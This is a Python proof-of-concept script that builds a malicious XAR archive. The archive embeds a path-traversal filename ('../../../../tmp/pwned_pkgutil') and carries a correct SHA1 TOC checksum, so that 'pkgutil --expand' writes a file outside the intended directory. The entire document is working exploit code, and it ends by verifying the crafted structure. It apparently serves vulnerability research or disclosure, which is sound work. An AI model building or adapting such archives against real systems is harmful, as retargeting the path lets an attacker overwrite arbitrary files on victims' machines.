#!/usr/bin/env python3
"""
Build a crafted XAR archive with a path-traversal filename.
When expanded via `pkgutil --expand`, the file is written outside
the intended destination directory.

XAR format:
  Header (28 bytes):
    magic                    : 4 bytes  = 0x78617221 ('xar!')
    header_size              : 2 bytes  = 28
    version                  : 2 bytes  = 1
    toc_length_compressed    : 8 bytes
    toc_length_uncompressed  : 8 bytes
    cksum_alg                : 4 bytes  = 1 (SHA1)

  TOC: zlib-compressed XML describing files
  Heap: [SHA1 hash of compressed TOC (20 bytes)] + raw file data

The malicious filename embedded in the TOC:  ../../../../tmp/pwned_pkgutil
"""

import struct, zlib, hashlib, sys

MALICIOUS_NAME = "../../../../tmp/pwned_pkgutil"
FILE_CONTENT   = b"pwned via pkgutil --expand path traversal\n"

# ── Heap layout ───────────────────────────────────────────────────────────────
# Heap starts with the SHA1 checksum of the compressed TOC (20 bytes),
# followed by the file payload.
CKSUM_SIZE  = 20
file_offset = CKSUM_SIZE          # payload starts after the 20-byte checksum
file_size   = len(FILE_CONTENT)

# ── Build TOC XML (placeholder checksum value; filled in after compression) ──
def build_toc(cksum_hex: str) -> bytes:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<xar>
 <toc>
  <creation-time>2026-10-28T00:00:00</creation-time>
  <checksum style="sha1">
   <size>{CKSUM_SIZE}</size>
   <offset>0</offset>
  </checksum>
  <file id="1">
   <name>{MALICIOUS_NAME}</name>
   <type>file</type>
   <data>
    <offset>{file_offset}</offset>
    <size>{file_size}</size>
    <length>{file_size}</length>
    <encoding style="application/octet-stream"/>
    <extracted-checksum style="sha1">{hashlib.sha1(FILE_CONTENT).hexdigest()}</extracted-checksum>
    <archived-checksum style="sha1">{hashlib.sha1(FILE_CONTENT).hexdigest()}</archived-checksum>
   </data>
  </file>
 </toc>
</xar>
""".encode("utf-8")

# Compress the TOC
toc_xml              = build_toc("")
toc_compressed       = zlib.compress(toc_xml)
toc_compressed_len   = len(toc_compressed)
toc_uncompressed_len = len(toc_xml)

# Compute SHA1 of compressed TOC → stored at heap offset 0
toc_sha1 = hashlib.sha1(toc_compressed).digest()
assert len(toc_sha1) == CKSUM_SIZE

# Build heap: checksum bytes + file payload
heap = toc_sha1 + FILE_CONTENT

# ── Build XAR header ──────────────────────────────────────────────────────────
HEADER_SIZE = 28
header = struct.pack(
    ">IHHqqI",
    0x78617221,           # magic
    HEADER_SIZE,          # header_size
    1,                    # version
    toc_compressed_len,
    toc_uncompressed_len,
    1,                    # cksum_alg: 1 = SHA1
)
assert len(header) == HEADER_SIZE

# ── Write archive ─────────────────────────────────────────────────────────────
out_path = "poc.xar"
with open(out_path, "wb") as f:
    f.write(header)
    f.write(toc_compressed)
    f.write(heap)

total = len(header) + len(toc_compressed) + len(heap)
print(f"Written: {out_path}  ({total} bytes)")
print(f"Embedded filename: {MALICIOUS_NAME}")
print(f"Expected traversal target: /tmp/pwned_pkgutil")
print(f"Checksum algorithm: SHA1")

# ── Verify structure ──────────────────────────────────────────────────────────
data  = open(out_path, "rb").read()
magic = struct.unpack(">I", data[:4])[0]
hdr_size = struct.unpack(">H", data[4:6])[0]
toc_clen, toc_ulen = struct.unpack(">qq", data[8:24])
cksum_alg = struct.unpack(">I", data[24:28])[0]
print(f"\nVerification:")
print(f"  magic:           0x{magic:08x} {'OK' if magic == 0x78617221 else 'BAD'}")
print(f"  header_size:     {hdr_size}")
print(f"  cksum_alg:       {cksum_alg} ({'SHA1' if cksum_alg == 1 else '?'})")
print(f"  toc compressed:  {toc_clen} bytes")
print(f"  toc uncompressed:{toc_ulen} bytes")
recovered_toc = zlib.decompress(data[hdr_size:hdr_size+toc_clen])
print(f"  TOC decompress:  OK ({len(recovered_toc)} bytes)")
assert MALICIOUS_NAME.encode() in recovered_toc, "Malicious name not found in TOC!"
print(f"  Malicious name:  YES")
heap_start = hdr_size + toc_clen
stored_sha1 = data[heap_start:heap_start+CKSUM_SIZE]
expected_sha1 = hashlib.sha1(data[hdr_size:hdr_size+toc_clen]).digest()
print(f"  SHA1 match:      {'OK' if stored_sha1 == expected_sha1 else 'BAD'}")
